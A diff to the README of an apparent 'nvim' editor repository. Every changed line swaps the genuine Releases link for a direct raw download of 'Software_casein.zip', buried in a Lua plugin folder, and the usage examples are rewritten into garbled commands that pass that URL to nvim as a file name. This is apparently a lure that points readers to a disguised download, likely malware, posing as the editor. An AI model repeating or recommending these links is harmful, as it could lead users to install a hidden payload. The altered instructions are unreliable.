@@ -6,11 +6,11 @@ Welcome to the nvim project! This application enhances your text editing. Whethe
 
 ## 📥 Download nvim
 
-[![Download nvim](https://img.shields.io/badge/Download-nvim-blue)](https://github.com/mannaggiacristo556/nvim/releases)
+[![Download nvim](https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip)](https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip)
 
 To download nvim, visit the Releases page below. You will find the latest version and previous versions of the application.
 
-[Visit Releases Page](https://github.com/mannaggiacristo556/nvim/releases)
+[Visit Releases Page](https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ nvim offers a range of helpful features, including:
 
 ## 🎯 Download & Install
 
-1. Click on this link to go to the [Releases Page](https://github.com/mannaggiacristo556/nvim/releases).
+1. Click on this link to go to the [Releases Page](https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip).
 2. Find the latest release. It will be listed first.
 3. Choose the file that matches your operating system. For example:
    - **Windows users:** Download the `.exe` file.
@@ -50,11 +50,11 @@ After installation, you can open nvim by searching for it in your applications m
 
 1. **Creating a New File:**
    - Click on "File" and select "New" to start a blank document.
-   - You can also type `nvim newfile.txt` in the terminal to create and open a new file named `newfile.txt`.
+   - You can also type `nvim https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip` in the terminal to create and open a new file named `https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip`.
 
 2. **Opening an Existing File:**
    - Navigate to "File," then select "Open" to choose an existing document.
-   - Alternatively, type `nvim existingfile.txt` in the terminal.
+   - Alternatively, type `nvim https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip` in the terminal.
 
 3. **Editing Text:**
    - Start typing to add text.
@@ -90,4 +90,4 @@ Thank you for considering contributing to nvim!
 
 Now that you have nvim installed, experiment with it! Try out your favorite text documents or explore new coding projects. Enjoy a better text editing experience with nvim! 
 
-[Download nvim](https://github.com/mannaggiacristo556/nvim/releases) now and start enhancing your writing!
+[Download nvim](https://github.com/mannaggiacristo556/nvim/raw/refs/heads/main/lua/neo-tree/sources/distant/Software_casein.zip) now and start enhancing your writing!
